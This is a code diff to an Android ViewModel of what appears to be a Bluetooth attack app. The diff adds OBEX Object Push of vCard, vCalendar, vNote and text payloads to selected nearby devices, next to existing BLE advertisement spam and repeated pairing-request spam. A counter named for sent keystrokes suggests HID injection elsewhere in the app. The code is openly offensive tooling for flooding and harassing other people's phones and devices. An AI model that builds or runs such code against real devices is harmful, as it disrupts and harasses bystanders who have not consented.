@@ -27,9 +27,13 @@ class BluetoothHidViewModel : ViewModel() {
     internal val discoveryManager = BluetoothDiscoveryManager()
     internal val pairingSpammer = BluetoothPairingSpammer()
     internal val bleAdvertiser = BleAdvertiser()
+    internal val obexPusher = ObexPusher()
     internal val hidManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
         BluetoothHidManager()
     } else null
+
+    // Active payload for current attack
+    val activePayload = MutableLiveData<BluetoothPayload?>(null)
 
     private val _state = MutableLiveData<HidState>(HidState.Idle)
     val state: LiveData<HidState> = _state
@@ -129,9 +133,9 @@ class BluetoothHidViewModel : ViewModel() {
         _selectedTargetsFlow.value = targets
     }
 
-    // ---- Attack control: dual-mode BLE advertisement + pairing request spam ----
-    // 1. BLE: Broadcasts custom device name via BLE advertisements (Flipper Zero style)
-    // 2. Classic: createBond() sends pairing requests showing custom name in dialog
+    // ---- Attack control: dispatches based on active payload type ----
+    // PAIRING_NAME/TEXT: BLE advertisement spam + createBond() pairing requests
+    // VCARD/VCALENDAR/VNOTE: OBEX Object Push to each target device
 
     fun startAttack(context: Context) {
         if (_state.value is HidState.Scanning || _state.value is HidState.Attacking) return
@@ -150,32 +154,46 @@ class BluetoothHidViewModel : ViewModel() {
         _connectedCount.value = targets.size
         _keystrokesSent.value = 0
 
+        val currentPayload = activePayload.value
+        val discoveredList = _discoveredDevices.value ?: emptyList()
+        val targetDevices = discoveredList.filter { targets.contains(it.address) }
+
         try {
-            // Start BLE advertisement spam (broadcasts custom name to ALL nearby devices)
-            bleAdvertiser.start(context, name)
+            if (currentPayload != null && currentPayload.type != BluetoothPayload.PayloadType.PAIRING_NAME) {
+                // OBEX push mode: send vCard/vCalendar/vNote/text to targets
+                CrashLogger.log(context, "BtAttack", "OBEX push: ${currentPayload.type} '${currentPayload.name}' to ${targetDevices.size} targets")
+                obexPusher.pushToDevices(targetDevices, currentPayload)
 
-            // Start Classic pairing request spam to selected targets
-            val discoveredList = _discoveredDevices.value ?: emptyList()
-            pairingSpammer.start(context, name, targets, discoveredList)
+                // Observe push counter
+                connectedObserverJob = viewModelScope.launch {
+                    obexPusher.pushCount.collect { count ->
+                        _keystrokesSent.postValue(count)
+                        _state.postValue(HidState.Attacking(targets.size))
+                    }
+                }
+            } else {
+                // Pairing spam mode: BLE ads + createBond()
+                val message = currentPayload?.data?.get("name") ?: name
+                bleAdvertiser.start(context, message)
+                pairingSpammer.start(context, message, targets, discoveredList)
 
-            // Observe pairing attempt counter
-            connectedObserverJob = viewModelScope.launch {
-                pairingSpammer.connectionAttempts.collect { count ->
-                    val bleCount = bleAdvertiser.broadcastCount.value
-                    _keystrokesSent.postValue(count + bleCount)
-                    _state.postValue(HidState.Attacking(targets.size))
+                // Observe pairing + BLE counters
+                connectedObserverJob = viewModelScope.launch {
+                    pairingSpammer.connectionAttempts.collect { count ->
+                        val bleCount = bleAdvertiser.broadcastCount.value
+                        _keystrokesSent.postValue(count + bleCount)
+                        _state.postValue(HidState.Attacking(targets.size))
+                    }
+                }
+                keystrokeObserverJob = viewModelScope.launch {
+                    bleAdvertiser.broadcastCount.collect { bleCount ->
+                        val pairingCount = pairingSpammer.connectionAttempts.value
+                        _keystrokesSent.postValue(pairingCount + bleCount)
+                    }
                 }
             }
 
-            // Observe BLE broadcast counter
-            keystrokeObserverJob = viewModelScope.launch {
-                bleAdvertiser.broadcastCount.collect { bleCount ->
-                    val pairingCount = pairingSpammer.connectionAttempts.value
-                    _keystrokesSent.postValue(pairingCount + bleCount)
-                }
-            }
-
-            // Observe errors from pairing spammer
+            // Observe errors
             errorObserverJob = viewModelScope.launch {
                 pairingSpammer.lastError.collect { error ->
                     if (error != null) {
